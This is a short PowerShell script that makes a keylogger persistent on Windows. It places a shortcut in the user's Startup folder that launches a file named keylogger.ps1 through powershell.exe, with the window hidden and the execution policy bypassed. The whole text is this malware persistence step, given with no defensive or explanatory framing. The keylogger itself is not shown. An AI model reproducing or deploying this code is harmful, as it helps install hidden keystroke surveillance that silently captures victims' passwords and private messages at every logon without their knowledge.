$path = "C:\Users\Public\keylogger.ps1"
$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.lnk"

$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($shortcut)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-windowstyle hidden -ExecutionPolicy Bypass -NoProfile -File $path"
$Shortcut.Save()
